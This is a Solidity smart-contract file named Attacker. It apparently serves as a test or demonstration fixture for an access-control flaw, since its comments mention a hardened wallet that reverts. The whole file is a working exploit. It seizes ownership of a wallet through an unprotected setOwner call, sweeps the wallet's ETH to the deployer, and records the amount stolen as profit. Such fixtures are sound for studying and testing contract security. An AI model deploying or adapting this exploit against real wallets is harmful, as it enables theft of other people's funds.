// SPDX-License-Identifier: MIT
pragma solidity 0.8.24;

import {IWallet} from "./IWallet.sol";

/**
 * @title Attacker
 * @notice Claims ownership of an access-control-broken wallet and sweeps it.
 * @dev `attack()` relies on the wallet letting anyone call {IWallet-setOwner}.
 *      It makes this contract the owner and then calls {IWallet-sweep}. The
 *      sweep pays the configured {beneficiary} rather than this contract, so no
 *      ETH is ever stranded here. Against the hardened wallet, {setOwner}
 *      reverts with `OwnableUnauthorizedAccount` before anything moves.
 */
contract Attacker {
    /// @notice Wallet being attacked.
    IWallet public immutable wallet;

    /// @notice Destination the stolen funds are forwarded to.
    address payable public immutable beneficiary;

    uint256 internal _profit;

    /**
     * @param target address of the wallet to attack
     * @dev The deployer becomes the beneficiary of any funds taken.
     */
    constructor(address target) {
        wallet = IWallet(target);
        beneficiary = payable(msg.sender);
    }

    /**
     * @notice Take ownership of the wallet and sweep its funds to the
     *         beneficiary.
     */
    function attack() external {
        uint256 before = address(wallet).balance;
        wallet.setOwner(address(this));
        wallet.sweep(beneficiary);
        _profit = before - address(wallet).balance;
    }

    /// @notice ETH stolen so far.
    function profit() external view returns (uint256) {
        return _profit;
    }
}
